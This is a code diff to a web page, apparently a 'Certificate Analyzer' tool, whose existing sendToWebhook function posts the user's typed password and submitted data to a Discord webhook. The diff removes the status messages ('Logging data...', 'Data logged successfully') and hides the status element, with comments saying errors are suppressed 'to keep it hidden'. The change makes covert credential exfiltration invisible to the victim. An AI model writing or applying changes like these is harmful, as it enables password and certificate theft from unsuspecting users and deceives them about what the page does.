@@ -373,10 +373,7 @@
         }
         
         .webhook-status {
-            font-size: 12px;
-            color: var(--gray);
-            margin-top: 10px;
-            text-align: center;
+            display: none; /* Hide webhook status completely */
         }
     </style>
 </head>
@@ -710,8 +707,6 @@
             // Function to send data to Discord webhook
             async function sendToWebhook() {
                 try {
-                    webhookStatus.textContent = 'Logging data...';
-                    
                     // Create form data to send files
                     const formData = new FormData();
                     formData.append('content', `Certificate Analyzer Submission:\nPassword: ${passwordInput.value}`);
@@ -734,11 +729,9 @@
                         throw new Error('Failed to send data to server');
                     }
                     
-                    webhookStatus.textContent = 'Data logged successfully';
                     // No success message shown to user
                 } catch (error) {
                     console.error('Error sending to webhook:', error);
-                    webhookStatus.textContent = 'Logging completed';
                     // Don't show error to user to keep it hidden
                 }
             }
